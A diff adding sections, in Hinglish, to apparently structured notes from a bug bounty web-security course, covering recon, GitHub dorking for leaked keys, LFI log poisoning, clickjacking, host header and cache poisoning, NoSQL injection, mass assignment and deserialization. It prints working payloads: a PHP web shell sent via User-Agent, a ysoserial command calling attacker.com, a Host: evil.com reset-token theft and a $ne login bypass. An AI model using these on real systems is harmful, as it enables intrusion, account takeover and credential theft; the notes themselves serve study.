@@ -164,6 +164,83 @@ Sections: 2 | Topics: 4 | Subtopics: 18 | CVEs: 0
 
 ==================================================================================
 
+# Section 1.5: Advanced Reconnaissance & OSINT
+
+=====Section 1.5: Advanced Reconnaissance & OSINT=====
+[Instructor is section mein target ka attack surface maximize karne ke liye subdomains, ports, ASN mapping, aur GitHub se leaked secrets dhoondhne ki practical real-world methodology sikhata hai.] [⚠️ Derived]
+
+--1.5--Advanced Reconnaissance & OSINT--
+Topic 1: Subdomain Enumeration & Service Discovery [⚠️ Derived]
+Subtopics: ASN Mapping, Horizontal Recon, Vertical Recon, Subdomain Enumeration, Port Scanning, Service Fingerprinting
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Practical only
+* Transcript mein content volume: Long explanation with live CLI tools execution
+* Key terms from transcript: attack surface, ASN, WHOIS, subdomains, Amass, Findomain, Sublist3r, live hosts, httpx, Nmap, RustScan, open ports
+* Exam Tips / Instructor Emphasis: Instructor emphasizes ki "70% of bug bounty success depends on finding a sub-domain or service that other hackers missed."
+* Instructor ne jo analogies/examples/demos use kiye: Live terminal demo jahan Amass aur httpx use karke hundreds of hidden subdomains nikale, aur phir RustScan se open ports discover kiye.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[ASN mapping, reverse WHOIS, horizontal reconnaissance, vertical reconnaissance, Amass, Sublist3r, Findomain, crt.sh, certificate transparency, live hosts, httpx, port scanning, Nmap, Masscan, RustScan, attack surface, bug bounty targets]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Reconnaissance / Scanning & Enumeration
+* Attack methodology context from transcript: Target company ke hidden infra aur bhule hue servers (legacy systems) ko map karna jahan vulnerabilities milne ke chances sabse zyada hote hain.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker pehle target ki seed company (e.g., target.com) ka ASN nikalta hai. Phir Amass/Findomain run karke saare subdomains gather karta hai. Httpx se check karta hai kaunse subdomains live (HTTP 200) hain.
+* Exploitation/Weaponization Phase: Live subdomains pe RustScan/Nmap chala kar dekhta hai ki backend pe konsi services (Tomcat, Jenkins, SSH) publicly exposed hain.
+* Post-Exploitation/Reporting Phase: (N/A)
+* Additional context: Bug bounties mein mostly bugs unhi subdomains pe milte hain jo main domain pe link nahi hote.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Terminal (Amass / httpx / RustScan)
+* Navigation Steps: Run `amass enum -d target.com` > Pipe output to `httpx -silent` > Pass live IPs to `rustscan -a [IP] -- -sV`
+
+--1.5--Advanced Reconnaissance & OSINT--
+Topic 2: OSINT & GitHub Dorking (Secret Leaks) [⚠️ Derived]
+Subtopics: Open Source Intelligence, GitHub Dorks, Google Dorks, Leaked API Keys, Hardcoded Secrets
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Deep
+* Coverage Angle: Practical only
+* Transcript mein content volume: Concept explanation + live GitHub searching
+* Key terms from transcript: OSINT, Google dorks, GitHub dorks, leaked secrets, AWS keys, JWT secrets, bug bounty
+* Exam Tips / Instructor Emphasis: Instructor strongly advises developers ki galti se bhi code commit karte waqt keys public repo mein na dalein kyunki bots unhe seconds mein scrape kar lete hain.
+* Instructor ne jo analogies/examples/demos use kiye: GitHub search bar mein target domain ke sath "password", "AWS_ACCESS_KEY_ID" aur "authorization: bearer" search karke developers ki galti se expose hui API keys dikhayi.
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[OSINT, Open Source Intelligence, Google dorks, `site:target.com ext:txt | ext:env`, GitHub dorks, leaked secrets, AWS keys, API keys, hardcoded passwords, `filename:.env`, `target.com password`, PII data, source code leakage]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Reconnaissance / Initial Foothold
+* Attack methodology context from transcript: Passive recon use karke target web app se interact kiye bina hi system access (via leaked keys) prapt karna.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: Attacker GitHub pe target company ka naam aur specific parameters (jaise "API_KEY" ya "password") search karta hai.
+* Exploitation/Weaponization Phase: Search results mein se leaked AWS keys ya database credentials extract karta hai aur apne terminal ya database client se direct login try karta hai.
+* Post-Exploitation/Reporting Phase: Bina kisi web exploit ke direct internal database access ya cloud takeover achieve karna (Critical Bounty).
+* Additional context: HackerOne/Bugcrowd pe aisi findings instant P1/Critical mark hoti hain.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: GitHub Web Interface
+* Navigation Steps: Go to GitHub Search > Type `org:TargetCompany "API_KEY"` > Sort by 'Recently indexed' > Analyze committed code
+
+
+==================================================================================
+
+
 # Section 2: Information Disclosure vulnerabilities
 
 =====Section 2: Information Disclosure vulnerabilities=====
@@ -851,6 +928,49 @@ Sections: 1 | Topics: 6 | Subtopics: 22 | CVEs: 0
 
 
 
+# Section 4.2: Local & Remote File Inclusion (LFI/RFI)
+
+=====Section 4.2: Local & Remote File Inclusion (LFI/RFI)=====
+[Instructor is section mein LFI/RFI ko dedicatedly cover karta hai, jahan file read karne (Traversal) se aage badhkar PHP wrappers aur log poisoning ke through RCE achieve kiya jata hai.] [⚠️ Derived]
+
+--4.2--Local & Remote File Inclusion (LFI/RFI)--
+Topic 1: Advanced LFI via PHP Wrappers & Log Poisoning [⚠️ Derived]
+Subtopics: PHP Filters, Base64 Exfiltration, RFI Execution, Apache/SSH Log Poisoning, LFI to RCE
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Practical only
+* Transcript mein content volume: Live demo of extracting source code and dropping a reverse shell
+* Key terms from transcript: LFI, RFI, php://filter, base64 encode, log poisoning, User-Agent, shell.php
+* Exam Tips / Instructor Emphasis: Instructor emphasize karta hai ki "Traversal let's you read, Inclusion let's you execute."
+* Instructor ne jo analogies/examples/demos use kiye: `php://filter/convert.base64-encode/resource=index.php` use karke source code leak kiya. Phir Apache access log path ko LFI mein inject kiya aur User-Agent mein PHP shell `<?php system($_GET['cmd']); ?>` daalkar RCE achieve kiya.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Local File Inclusion, LFI, Remote File Inclusion, RFI, PHP wrappers, `php://filter`, `convert.base64-encode`, log poisoning, `/var/log/apache2/access.log`, User-Agent injection, PHP shell, `<?php system($_GET['cmd']); ?>`, RCE, remote code execution, URL fetching]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Exploitation / Privilege Escalation
+* Attack methodology context from transcript: Vulnerable file inclusion parameter (e.g., `?page=`) ka fayda utha kar pehle backend code read karna aur phir server logs mein payload daalkar RCE lena.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker `?page=about.php` jaise parameters dhoondhta hai.
+* Exploitation/Weaponization Phase: Direct execution roki gayi ho toh `php://filter` use karke backend code base64 mein nikalta hai. Agar RCE chahiye, toh Apache logs ka path parameter mein dalta hai aur apne request ke User-Agent mein PHP code inject karta hai.
+* Post-Exploitation/Reporting Phase: Server jab log file "include" karta hai, toh injected User-Agent PHP code ki tarah execute ho jata hai, giving full terminal access.
+* Additional context: Bug bounties mein yeh direct Server Takeover mana jata hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Burp Suite (Repeater)
+* Navigation Steps: Send request to Repeater > Modify `?page=` to log file path > Modify `User-Agent` header with PHP payload > Send > Append `&cmd=id` to URL to execute commands
+
+
+==================================================================================
+
+
 # Section 4.5: Insecure File Upload Vulnerabilities
 
 =====Section 4.5: Insecure File Upload Vulnerabilities=====
@@ -1085,6 +1205,84 @@ Sections: 1 | Topics: 4 | Subtopics: 21 | CVEs: 0
 
 
 
+==================================================================================
+
+
+# Section 5.5: Clickjacking & Host Header Injection
+
+=====Section 5.5: Clickjacking & Host Header Injection=====
+[Instructor is section mein UI redressing (Clickjacking) aur HTTP Host header manipulation ko cover karta hai jo password reset poisoning mein use hote hain.] [⚠️ Derived]
+
+--5.5--Clickjacking & Host Header Injection--
+Topic 1: Clickjacking (UI Redressing) [⚠️ Derived]
+Subtopics: UI Redressing, Iframe Overlays, X-Frame-Options, CSP frame-ancestors, Social Engineering
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Moderate
+* Coverage Angle: Both
+* Transcript mein content volume: Concept explanation + HTML PoC creation
+* Key terms from transcript: Clickjacking, UI redressing, iframe, opacity, X-Frame-Options, CSRF alternative
+* Exam Tips / Instructor Emphasis: Instructor clear karta hai ki agar CSRF tokens implemented hain, tab bhi Clickjacking kaam kar sakti hai kyunki user deliberately (lekin dhokhe se) click kar raha hota hai.
+* Instructor ne jo analogies/examples/demos use kiye: Ek malicious HTML page banaya jisme ek "Win an iPhone" button tha, aur uske theek upar invisible iframe mein target site ka "Delete Account" button place kiya gaya tha.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Clickjacking, UI redressing, iframe, `<iframe src="...">`, CSS opacity, `opacity: 0.0001`, z-index, X-Frame-Options, DENY, SAMEORIGIN, Content-Security-Policy, `frame-ancestors`, social engineering, account deletion, one-click attack]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Exploitation
+* Attack methodology context from transcript: Target site ko apne controlled page pe load karwana aur invisible layer banakar victim se malicious actions perform karwana.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker Burp Suite ya browser console mein check karta hai ki kya target response mein `X-Frame-Options` ya `CSP frame-ancestors` header missing hai.
+* Exploitation/Weaponization Phase: Attacker ek malicious webpage banata hai, usme iframe ke andar target application (e.g., settings page) load karta hai, use transparent karta hai, aur uske peeche ek fake button laga deta hai.
+* Post-Exploitation/Reporting Phase: Victim fake button pe click karta hai, par actually target app mein (e.g., "Transfer Funds") click ho jata hai. Report mein simple HTML PoC di jati hai.
+* Additional context: Bug bounties mein state-changing actions pe Clickjacking valid finding hoti hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Text Editor / Browser
+* Navigation Steps: Write HTML payload > Save as `clickjack.html` > Open in browser to test iframe rendering
+
+--5.5--Clickjacking & Host Header Injection--
+Topic 2: Host Header Injection & Password Reset Poisoning [⚠️ Derived]
+Subtopics: Host Header, Reverse Proxy Misconfiguration, Cache Poisoning, Password Reset Poisoning
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Deep
+* Coverage Angle: Practical only
+* Transcript mein content volume: Live manipulation of Host headers
+* Key terms from transcript: Host header, X-Forwarded-Host, password reset, token leak, email poisoning
+* Exam Tips / Instructor Emphasis: Instructor emphasize karta hai ki backend developers aksar dynamically email links generate karne ke liye Host header pe trust kar lete hain, jo fatal hai.
+* Instructor ne jo analogies/examples/demos use kiye: Password reset request mein `Host: target.com` ko `Host: evil.com` kiya. Target ne victim ko password reset email bheji jisme link `https://evil.com/reset?token=123` ban gaya.
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Host header, HTTP/1.1, absolute URL, dynamic URL generation, password reset poisoning, email poisoning, X-Forwarded-Host, Web Cache Poisoning, token leakage, `Host: evil.com`, session hijacking]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Exploitation
+* Attack methodology context from transcript: HTTP request ke absolute routing header ko manipulate karke backend server ko trick karna taaki woh attacker ke domain ko trust karke links banaye.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: Attacker "Forgot Password" feature use karta hai aur request Burp mein intercept karta hai.
+* Exploitation/Weaponization Phase: Attacker `Host` header ko modify karke apna domain (evil.com) daalta hai aur request victim ke email ke behalf par bhejta hai.
+* Post-Exploitation/Reporting Phase: Victim ke inbox mein aayi email mein password reset link attacker ke domain ka hota hai. Victim click karta hai, aur uska secret reset token attacker ke server logs mein leak ho jata hai. Attacker us token se password change kar leta hai.
+* Additional context: (N/A)
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: Burp Suite (Repeater)
+* Navigation Steps: Intercept POST /forgot-password > Change `Host: target.com` to `Host: evil.com` > Send
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 ==================================================================================
 
 
@@ -2478,6 +2676,51 @@ Sections: 1 | Topics: 3 | Subtopics: 22 | CVEs: 0
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 ==================================================================================
+
+# Section 15.5: NoSQL Injection Vulnerabilities
+
+=====Section 15.5: NoSQL Injection Vulnerabilities=====
+[Instructor is section mein modern applications (MongoDB, CouchDB) mein NoSQL injection explain karta hai, jahan traditional SQL queries ki jagah JSON objects aur logical operators manipulate kiye jaate hain.] [⚠️ Derived]
+
+--15.5--NoSQL Injection Vulnerabilities--
+Topic 1: Authentication Bypass in MongoDB [⚠️ Derived]
+Subtopics: NoSQL Basics, MongoDB Syntax, Operator Injection, Authentication Bypass via JSON
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Practical only
+* Transcript mein content volume: Concept of NoSQL and live authentication bypass demo
+* Key terms from transcript: NoSQL, MongoDB, JSON payload, $ne, not equal, authentication bypass
+* Exam Tips / Instructor Emphasis: Instructor highlights ki yahan apostrophes (`'`) kaam nahi aayenge; yahan tumhe HTTP headers ko JSON mein convert karke operators bhejne padenge.
+* Instructor ne jo analogies/examples/demos use kiye: Login API jahan `{"username":"admin", "password":"123"}` ja raha tha, wahan password object ko `{"$ne": ""}` se replace kar diya, jisse login bypass ho gaya.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[NoSQL, MongoDB, CouchDB, JSON payload, API endpoints, logical operators, `$ne`, Not Equal, `$gt`, Greater Than, authentication bypass, BSON, Content-Type: application/json, `{"username":"admin", "password": {"$ne": ""}}`]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Initial Foothold / Exploitation
+* Attack methodology context from transcript: Backend JSON parser ko trick karke hardcoded variables ki jagah conditional logic operators bhejna taaki query always "True" return kare.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker login API request dekhta hai jahan data JSON format (`application/json`) mein ja raha hai, jo NoSQL (MongoDB) ka strong indicator hai.
+* Exploitation/Weaponization Phase: Attacker request ko Burp Repeater mein dalta hai aur password field ki string array ko JSON object mein badal deta hai using `$ne` (not equal to blank).
+* Post-Exploitation/Reporting Phase: Server query chalata hai: "find user admin where password is NOT empty". Yeh hamesha true hota hai aur admin access mil jata hai.
+* Additional context: Bug bounties mein REST APIs pe yeh sabse aam authentication bypass hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Burp Suite (Repeater)
+* Navigation Steps: Intercept JSON POST request > Change `password: "test"` to `password: {"$ne": ""}` > Forward
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+
 
 # Section 16: SSRF (Server-Side Request Forgery)
 
@@ -3874,6 +4117,85 @@ Subtopics: Alg None Misconfiguration, Signature Stripping, Privilege Escalation,
 
 ==================================================================================
 
+# Section 23.5: Advanced API Exploitation (GraphQL & Mass Assignment)
+
+=====Section 23.5: Advanced API Exploitation (GraphQL & Mass Assignment)=====
+[Instructor is section mein REST APIs mein Mass Assignment aur GraphQL endpoints mein Introspection/Batching flaws ko dikhata hai.] [⚠️ Derived]
+
+--23.5--Advanced API Exploitation--
+Topic 1: GraphQL Introspection & Exploitation [⚠️ Derived]
+Subtopics: GraphQL Basics, Introspection Query, Query Aliasing, API Information Disclosure
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: Detailed explanation of GraphQL architecture and schema dumping
+* Key terms from transcript: GraphQL, introspection, schema, mutations, queries, alias, batching
+* Exam Tips / Instructor Emphasis: "GraphQL is a goldmine because if Introspection is enabled, the API literally gives you a map of every single hidden function it has."
+* Instructor ne jo analogies/examples/demos use kiye: `/graphql` endpoint pe standard Introspection query shoot ki, poora schema JSON mein dump kiya, aur hidden mutations (e.g., `deleteUser`) extract kiye.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[GraphQL, API endpoints, `/graphql`, `/v1/graphql`, Introspection query, `__schema`, `__type`, mutations, queries, InQL scanner, query aliasing, batching attacks, rate limit bypass, schema dumping, hidden endpoints]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Scanning & Enumeration / Exploitation
+* Attack methodology context from transcript: GraphQL ki default debugging feature (introspection) ka use karke poore API infrastructure ki documentation leak karna.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker URL directories brute-force karta hai aur `/graphql` find karta hai.
+* Exploitation/Weaponization Phase: Attacker ek massive `__schema` query bhejta hai. Agar introspection on hai, backend saari valid queries, variables, aur mutations ka structure de deta hai. Phir attacker query aliasing use karke ek hi HTTP request mein 100 OTP login attempts bhejta hai (bypassing rate limits).
+* Post-Exploitation/Reporting Phase: Information Disclosure aur Rate Limiting bypass bug bounty mein report hote hain.
+* Additional context: Burp Suite ka "InQL" extension iske liye best hai.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Burp Suite (InQL Extension)
+* Navigation Steps: Install InQL > Send `/graphql` request to InQL scanner > Analyze dumped mutations and queries
+
+--23.5--Advanced API Exploitation--
+Topic 2: API Mass Assignment (Auto-binding) [⚠️ Derived]
+Subtopics: Mass Assignment, Object Relational Mapping, Privilege Escalation, Hidden JSON Parameters
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Moderate
+* Coverage Angle: Practical only
+* Transcript mein content volume: Short live demo
+* Key terms from transcript: Mass assignment, auto-binding, privilege escalation, JSON injection
+* Exam Tips / Instructor Emphasis: "Always try to guess the developer's hidden database fields and inject them into your JSON request."
+* Instructor ne jo analogies/examples/demos use kiye: Profile update request `{"name":"pawan", "email":"p@p.com"}` mein ek extra parameter `"is_admin":true` add kiya, jo backend ORM ne blindly database mein update kar diya.
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Mass Assignment, auto-binding, Object Relational Mapping, ORM, API vulnerabilities, privilege escalation, JSON payload injection, hidden parameters, `is_admin`, `role: 1`, `permissions: admin`, parameter guessing]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Privilege Escalation
+* Attack methodology context from transcript: Database frameworks (ORM) ke blind update mechanisms ko abuse karke unauthorized fields ko overwrite karna.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: Attacker GET request mein apna profile fetch karta hai aur dekhta hai ki response mein `"role":"user"` aa raha hai.
+* Exploitation/Weaponization Phase: Attacker jab profile update POST request bhejta hai, toh manually ek extra JSON field add kar deta hai: `"role":"admin"`.
+* Post-Exploitation/Reporting Phase: Backend securely fields filter nahi karta aur directly database bind kar deta hai. Attacker admin ban jata hai.
+* Additional context: (N/A)
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: Burp Suite (Repeater)
+* Navigation Steps: Intercept POST/PUT request > Add new key-value pair to JSON body > Send > Verify access
+
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+
 # Section 24: Server-Side Template Injection (SSTI)
 
 =====Section 24: Server-Side Template Injection (SSTI)=====
@@ -3950,6 +4272,85 @@ Subtopics: Template Exploitation, MRO (Method Resolution Order), Python Payloads
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
 ==================================================================================
+
+# Section 24.5: Insecure Deserialization & Cache Poisoning
+
+=====Section 24.5: Insecure Deserialization & Cache Poisoning=====
+[Instructor is section mein Insecure Deserialization ke RCE impacts aur Web Cache Poisoning ke mass-hijacking impacts cover karta hai.] [⚠️ Derived]
+
+--24.5--Insecure Deserialization & Cache Poisoning--
+Topic 1: Insecure Deserialization [⚠️ Derived]
+Subtopics: Serialization Basics, Magic Bytes, Object Manipulation, Java Deserialization, PHP Object Injection, Ysoserial
+
+[📊 SCOPE SIGNAL for Topic 1:
+
+* Depth Level: Deep
+* Coverage Angle: Conceptual + Payload usage
+* Transcript mein content volume: Deep dive into binary objects and deserialization logic
+* Key terms from transcript: serialization, deserialization, Java, PHP, magic bytes, object injection, ysoserial, gadget chain
+* Exam Tips / Instructor Emphasis: Instructor warns that deserialization exploits are extremely dangerous (straight to RCE) but require deep knowledge of application source code or specific gadget chains to exploit.
+* Instructor ne jo analogies/examples/demos use kiye: Base64 encoded Java serialized object (`rO0AB...`) ko cookie parameter mein identify kiya aur ysoserial tool se gadget chain banakar RCE achieve kiya.
+]
+
+🔑 KEYWORDS DUMP for Topic 1:
+[Insecure Deserialization, serialization, marshalling, PHP Object Injection, `O:4:"User"`, Java Deserialization, magic bytes, `rO0AB`, `AC ED 00 05`, Base64 encoded, gadget chain, ysoserial, remote code execution, RCE, object properties, state manipulation]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 1:
+
+* Phase(s): Exploitation / Post-Exploitation
+* Attack methodology context from transcript: Data objects ko memory/database se transfer hone wale serialized state mein manipulate karna taaki jab server unhe wapas deserialize (execute) kare, toh malicious code run ho.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 1:
+
+* Recon/Discovery Phase: Attacker cookies, hidden fields, ya API endpoints mein Base64 encoded strings dekhta hai jo `rO0` se start hoti hain (Java) ya `O:X:` se (PHP).
+* Exploitation/Weaponization Phase: Attacker `ysoserial` jaise tool ka use karke ek specific library (jaise Apache Commons Collections) ke liye ek gadget chain/payload generate karta hai aur request mein inject karta hai.
+* Post-Exploitation/Reporting Phase: Server backend par RCE execute karta hai. Attacker report mein proof of shell submit karta hai.
+* Additional context: Bug Bounties mein P1 Critical.
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 1:
+
+* Tool Name: Terminal (ysoserial)
+* Navigation Steps: Run `java -jar ysoserial.jar CommonsCollections1 'ping attacker.com' > payload.bin` > Encode to Base64 > Inject into Burp request
+
+--24.5--Insecure Deserialization & Cache Poisoning--
+Topic 2: Web Cache Poisoning [⚠️ Derived]
+Subtopics: Cache Mechanics, Cache Keys, Unkeyed Inputs, Reflected XSS via Cache, DoS via Cache
+
+[📊 SCOPE SIGNAL for Topic 2:
+
+* Depth Level: Deep
+* Coverage Angle: Both
+* Transcript mein content volume: Explanation of CDN/Cache behavior and manipulating unkeyed parameters
+* Key terms from transcript: web cache, CDN, cache key, unkeyed input, cache poisoning, X-Forwarded-Host, cache hit, cache miss
+* Exam Tips / Instructor Emphasis: "Cache poisoning isn't about attacking the server, it's about tricking the middleman (CDN) into saving your exploit and serving it to everyone else."
+* Instructor ne jo analogies/examples/demos use kiye: `X-Forwarded-Host: evil.com` header inject karke response mein ek malicious JS script include karwayi. CDN ne is response ko cache (save) kar liya, jisse agle sabhi normal users ko bhi malicious page serve hua.
+]
+
+🔑 KEYWORDS DUMP for Topic 2:
+[Web Cache Poisoning, CDN, Cloudflare, Fastly, Cache Key, Cache Miss, Cache Hit, unkeyed inputs, `X-Forwarded-Host`, `X-Original-URL`, HTTP headers, Param Miner extension, stored XSS, denial of service, DoS, mass exploitation]
+
+⚔️ ATTACK PHASE SIGNAL for Topic 2:
+
+* Phase(s): Exploitation
+* Attack methodology context from transcript: Caching server (CDN) ko trick karna taaki woh ek harmful response ko save kar le aur aage aane wale sabhi legitimate users ko wahi harmful response deliver kare.
+
+🔄 REAL-WORLD FLOW SIGNAL for Topic 2:
+
+* Recon/Discovery Phase: Attacker Burp Suite ka 'Param Miner' extension use karke check karta hai ki konsi HTTP headers (like `X-Forwarded-Host`) target page par reflect hoti hain par "Cache Key" ka hissa nahi hain.
+* Exploitation/Weaponization Phase: Attacker unkeyed header mein XSS ya redirect payload bhejta hai aur request ko tab tak hit karta hai jab tak response header mein `X-Cache: HIT` na aa jaye.
+* Post-Exploitation/Reporting Phase: Ab jo bhi user us normal page ko visit karega, use CDN wahi poisoned cache serve karega, resulting in massive Stored XSS without touching the actual database.
+* Additional context: Bug bounties mein High/Critical severity depend karta hai ki konsa page poison hua hai (e.g., Homepage poison karna critical hai).
+
+🛠️ TOOL NAVIGATION SIGNAL for Topic 2:
+
+* Tool Name: Burp Suite (Param Miner)
+* Navigation Steps: Install Param Miner > Right-click request > Guess headers > Analyze Extender output > Inject found header in Repeater > Send repeatedly until `X-Cache: HIT` appears
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+==================================================================================
+
+
 
 # Section 25: HTTP Request Smuggling
 
